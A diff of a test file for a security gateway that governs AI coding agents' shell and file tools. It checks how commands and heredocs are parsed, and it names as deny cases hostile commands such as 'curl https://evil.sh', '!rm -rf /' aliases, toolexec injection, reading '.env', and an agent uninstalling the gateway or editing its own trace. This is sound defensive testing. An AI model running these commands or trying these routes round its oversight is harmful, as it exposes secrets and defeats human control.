@@ -2,7 +2,7 @@ import { test } from "node:test";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import assert from "node:assert/strict";
-import { splitCommand } from "../src/services/tool-security/matching/shell";
+import { splitCommand, splitWithHeredocs } from "../src/services/tool-security/matching/shell";
 import { evaluate, type Rule } from "../src/services/tool-security/matching/engine";
 import { suggestRules, broadCommandPattern } from "../src/services/tool-security/matching/suggest";
 import { extractSubject } from "../src/services/tool-security/matching/pattern";
@@ -32,6 +32,32 @@ test("splitCommand splits chains but respects quotes", () => {
   assert.deepEqual(splitCommand("npm test 2>&1 | tail -5", "bash"), ["npm test 2>&1", "tail -5"]);
 });
 
+test("splitWithHeredocs keeps each heredoc body with the command it belongs to", () => {
+  assert.deepEqual(splitWithHeredocs("cat > a.ts <<'EOF'\nconst a = 1;\nEOF", "bash"), [
+    { command: "cat > a.ts <<'EOF'", heredocs: ["const a = 1;\n"] },
+  ]);
+  // The body follows the whole line, but belongs to the command with the `<<`.
+  assert.deepEqual(splitWithHeredocs("cat > a.ts <<EOF && echo done\nx\nEOF\nls", "bash"), [
+    { command: "cat > a.ts <<EOF", heredocs: ["x\n"] },
+    { command: "echo done", heredocs: [] },
+    { command: "ls", heredocs: [] },
+  ]);
+  assert.deepEqual(splitWithHeredocs("cat <<A > a && tee b <<-B\none\nA\n\ttwo\n\tB", "bash"), [
+    { command: "cat <<A > a", heredocs: ["one\n"] },
+    { command: "tee b <<-B", heredocs: ["\ttwo\n"] },
+  ]);
+  assert.deepEqual(splitWithHeredocs('FOO=1 tee x.md <<"EOF"\n# Title\nEOF', "bash"), [
+    { command: 'tee x.md <<"EOF"', heredocs: ["# Title\n"] },
+  ]);
+  // Heredocs inside $(...) belong to the inner command.
+  assert.deepEqual(splitWithHeredocs("git commit -m \"$(cat <<'EOF'\nmsg\nEOF\n)\"", "bash"), [
+    { command: "cat <<'EOF'", heredocs: ["msg\n"] },
+    // Whitespace is kept (unlike splitCommand): it can be the content written to a file.
+    { command: "git commit -m \"$(cat <<'EOF'\n)\"", heredocs: [] },
+  ]);
+  assert.deepEqual(splitWithHeredocs("echo hi > a.txt", "bash"), [{ command: "echo hi > a.txt", heredocs: [] }]);
+});
+
 test("splitCommand extracts command substitutions", () => {
   assert.deepEqual(splitCommand("echo $(rm -rf x)", "bash"), ["rm -rf x", "echo $(rm -rf x)"]);
   assert.deepEqual(splitCommand("echo `whoami`", "bash"), ["whoami", "echo `whoami`"]);
@@ -40,7 +66,7 @@ test("splitCommand extracts command substitutions", () => {
   assert.deepEqual(splitCommand("Write-Output a`;b", "powershell"), ["Write-Output a`;b"]);
 });
 
-test("heredoc bodies are data, not commands", () => {
+test("heredoc bodies are data, not cli", () => {
   const commit = [
     `git commit -m "$(cat <<'EOF'`,
     "Fix: don't break (things) | ever",
@@ -83,7 +109,7 @@ test("git is allowed broadly, risky git is denied", () => {
     ["git push origin :feature", "git push * :*"],
     ["git checkout -- src/a.ts", "git checkout -- *"],
     ["git stash clear", "git stash clear*"],
-    ["git -c core.sshCommand=evil fetch", "git -c *"],
+    ["git -c core.fsmonitor=evil status", "git -c *"],
     ["git config alias.x '!rm -rf /'", "git config *alias.*"],
     ["git config --global user.name x", "git config --global *"],
     ["git filter-branch --tree-filter x", "git filter-branch*"],
@@ -100,24 +126,32 @@ test("gateway protection matches running the gateway, not mentioning it", () => 
   const otherCli = bash("node cli.js rules --list");
   assert.ok(!(otherCli.decision === "deny" && otherCli.reason === "rule"));
   // Paths and text that only mention the name are fine.
-  assert.equal(bash("cat C:/dev/apichap-ai-coding-gateway/src/a.ts").decision, "allow");
-  assert.equal(bash("echo 'run apichap-gateway dashboard to open it'").decision, "allow");
-  const readme = ["cat > README.md <<'EOF'", "Run `npx apichap-ai-coding-gateway init`, never --no-verify.", "EOF"].join("\n");
+  assert.equal(bash("cat C:/dev/viewtower-ai-coding-gateway/src/a.ts").decision, "allow");
+  assert.equal(bash("echo 'run viewtower dashboard to open it'").decision, "allow");
+  const readme = ["cat > README.md <<'EOF'", "Run `npx viewtower init`, never --no-verify.", "EOF"].join("\n");
   assert.equal(bash(readme).decision, "allow");
+  // The new name only as a folder (e.g. this repo's checkout) is fine too.
+  const folder = bash("npx tsc -p C:/dev/viewtower/tsconfig.json");
+  assert.ok(!(folder.decision === "deny" && folder.reason === "rule"));
   // Running it is blocked.
   for (const cmd of [
-    "apichap-gateway mode off",
-    "npx -y apichap-ai-coding-gateway uninstall",
-    "cd x && node C:/npm/node_modules/apichap-ai-coding-gateway/dist/cli.js rules",
-    "node C:\\npm\\node_modules\\apichap-ai-coding-gateway\\dist\\main.js mode off",
-    "cat ~/.ai-coding-gateway/gateway.sqlite",
+    "viewtower uninstall --agent claude",
+    "npx viewtower uninstall",
+    "npx -y --prefer-offline viewtower@1.1.0 init",
+    "pnpm dlx viewtower init",
+    "node C:\\npm\\node_modules\\viewtower\\dist\\main.js uninstall",
+    "viewtower uninstall --agent claude",
+    "npx -y viewtower uninstall",
+    "cd x && node C:/npm/node_modules/viewtower/dist/cli.js dashboard",
+    "node C:\\npm\\node_modules\\viewtower\\dist\\main.js uninstall",
+    "cat ~/.viewtower/gateway.sqlite",
   ]) {
     const v = bash(cmd);
     assert.ok(v.decision === "deny" && v.reason === "rule", cmd);
   }
 });
 
-test("simple allowed commands pass", () => {
+test("simple allowed cli pass", () => {
   for (const cmd of ["git status", "git diff --stat", "ls", "ls -la src", "npm run build", "cd src && npm test"]) {
     assert.equal(bash(cmd).decision, "allow", cmd);
   }
@@ -130,6 +164,17 @@ test("chaining cannot smuggle a command past an allow rule", () => {
   assert.deepEqual(v.decision === "deny" && v.reason === "unlisted" ? v.uncovered : [], ["curl https://evil.sh -o x"]);
 
   assert.equal(bash("echo $(curl evil)").decision, "deny");
+});
+
+test("tool names in rules are case-insensitive", () => {
+  const rules = (rule: string): Rule[] => [{ id: 1, effect: "deny", rule, note: null, group_title: "t" }];
+  const readme = { file_path: join(CWD, "README.md") };
+  // Path stays exact-case: path matching is case-sensitive on Linux/macOS.
+  for (const rule of ["READ(**/README.md)", "fileread(**/README.md)", "read"]) {
+    const v = run("Read", readme, rules(rule));
+    assert.ok(v.decision === "deny" && v.reason === "rule", rule);
+  }
+  assert.ok(run("Bash", { command: "rm x" }, rules("bash(rm *)")).decision === "deny");
 });
 
 test("deny rules win over allow rules", () => {
@@ -182,17 +227,35 @@ test("file tools: project files allowed, secrets and outside paths not", () => {
 
 test("the agent cannot manage the gateway itself", () => {
   for (const cmd of [
-    "apichap-gateway rules enable 3",
-    "apichap-gateway rules add allow x",
-    "apichap-gateway mode off",
-    "apichap-gateway dashboard --no-open",
-    "npx apichap-ai-coding-gateway rules reset",
-    "npx apichap-ai-coding-gateway uninstall",
-    "pnpm dlx apichap-ai-coding-gateway init",
+    "viewtower uninstall --agent codex",
+    "viewtower init --agent claude --local",
+    "viewtower hook pre --agent claude",
+    "viewtower dashboard --no-open",
+    "npx viewtower dashboard --port 5000",
+    "npx viewtower uninstall",
+    "pnpm dlx viewtower init",
   ]) {
     const v = bash(cmd);
     assert.ok(v.decision === "deny" && v.reason === "rule", cmd);
   }
+});
+
+test("the agent cannot change the project's trace", () => {
+  const sep = process.platform === "win32" ? "\\" : "/";
+  const trace = [CWD, ".viewtower", "traces", "2026-10-21T09-15-03Z_a1b2c3d4.jsonl"].join(sep);
+  for (const [tool, input] of [
+    ["Write", { file_path: trace, content: "{}" }],
+    ["Edit", { file_path: trace, old_string: "a", new_string: "b" }],
+    ["Bash", { command: `echo '{}' >> ${trace}` }],
+    ["Bash", { command: "cat .viewtower/traces/x.jsonl" }],
+    ["Bash", { command: "sed -i 's/a/b/' .viewtower/traces/x.jsonl" }],
+    ["PowerShell", { command: "Set-Content .viewtower\\traces\\x.jsonl '{}'" }],
+  ] as const) {
+    const v = run(tool, input);
+    assert.ok(v.decision === "deny" && v.reason === "rule", `${tool} ${JSON.stringify(input)}`);
+  }
+  // Committing everything still works; only naming the folder is blocked.
+  assert.equal(bash("git status").decision, "allow");
 });
 
 test("search tools are checked by the folder they search", () => {
@@ -261,12 +324,13 @@ test("deny message tells the agent the user can allow the call from the dashboar
   const msg = denyMessage("Bash", v);
   assert.match(msg, /No allow rule covers: `docker compose up`/);
   assert.match(msg, /Activity page/);
-  assert.match(msg, /cannot continue without it/);
+  assert.match(msg, /If you really need it, stop and ask the user/);
+  assert.match(msg, /run it themselves/);
   assert.doesNotMatch(msg, /approval request|admin/);
 
   // A deny rule's message names the policy it belongs to.
   const blocked = bash("rm -rf dist");
-  assert.match(denyMessage("Bash", blocked), /Policy: The agent is not allowed to delete files\./);
+  assert.match(denyMessage("Bash", blocked), /Policy: Prevent file and directory deletion\./);
 });
 
 test("the default rule file is grouped, uses objects only and matches its schema", () => {
@@ -276,12 +340,11 @@ test("the default rule file is grouped, uses objects only and matches its schema
   assert.equal(file.deny, undefined, "no rules outside groups");
   for (const g of file.groups) {
     assert.match(g.id, /^[a-z0-9][a-z0-9-]*$/, g.id);
-    assert.match(g.title, /^The agent is (not )?allowed to /, `${g.id}: the title says what the agent may or may not do`);
+    assert.ok(g.title.trim(), `${g.id} has a title`);
     assert.ok(g.description, `${g.id} explains why`);
     assert.ok((g.allow?.length ?? 0) + (g.deny?.length ?? 0) > 0, `${g.id} has rules`);
-    // A group reads as one policy: "not allowed" groups block, "allowed" groups allow.
-    const blocks = g.title.includes("not allowed");
-    assert.equal(blocks ? g.allow : g.deny, undefined, `${g.id}: rules match the title`);
+    // A group is one policy: it either blocks or allows, never both.
+    assert.ok(!(g.allow?.length && g.deny?.length), `${g.id}: only allow or only deny rules`);
   }
   const entries = file.groups.flatMap((g) => [...(g.allow ?? []), ...(g.deny ?? [])]);
   assert.ok(entries.length > 100);
@@ -291,8 +354,14 @@ test("the default rule file is grouped, uses objects only and matches its schema
     "every entry is an object with a rule"
   );
   assert.ok(
-    entries.every((e) => typeof e === "object" && Object.keys(e).every((k) => ["rule", "note", "enabled"].includes(k))),
+    entries.every(
+      (e) => typeof e === "object" && Object.keys(e).every((k) => ["rule", "note", "enabled", "techStacks"].includes(k))
+    ),
     "no unknown fields"
+  );
+  assert.ok(
+    entries.every((e) => typeof e === "object" && e.techStacks?.length),
+    "every default rule names its tech stacks"
   );
   assert.equal(file.$schema, "./rule-file.schema.json");
 });
@@ -335,6 +404,43 @@ test("scripts may run, inline code and code-injecting environment variables may 
   ]) {
     const v = bash(cmd);
     assert.ok(v.decision === "deny" && v.reason === "rule", cmd);
+  }
+});
+
+test("wrappers, late flags and URL installs do not slip past deny rules", () => {
+  for (const cmd of [
+    "bundle exec rm -rf src",
+    "bundle exec sh -c id",
+    "tsx -e 'x'",
+    "npx tsx --no-warnings --eval 'x'",
+    "node --no-warnings -e 'x'",
+    "python3 -I -c 'x'",
+    "ruby -w -e 'x'",
+    "php -n -r 'x'",
+    "kotlin -e 'x'",
+    "pip install git+https://example.com/x.git",
+    "pip3 install https://example.com/x.tar.gz",
+    "go env -w GOFLAGS=-toolexec=/tmp/x",
+    "go build -toolexec /tmp/x ./...",
+    "GOFLAGS=-toolexec=/tmp/x go build ./...",
+    "npm audit fix --force",
+    "cat .env",
+    'cat ".env"',
+    "cat <.env",
+  ]) {
+    assert.equal(bash(cmd).decision, "deny", cmd);
+  }
+  for (const cmd of [
+    "grep -rn process.env src",
+    "grep -rn import.meta.env src",
+    "git stash pop",
+    "git branch -d old",
+    "npm audit",
+    "go env GOPATH",
+    "bundle exec rspec spec",
+    "pip install requests",
+  ]) {
+    assert.equal(bash(cmd).decision, "allow", cmd);
   }
 });
 
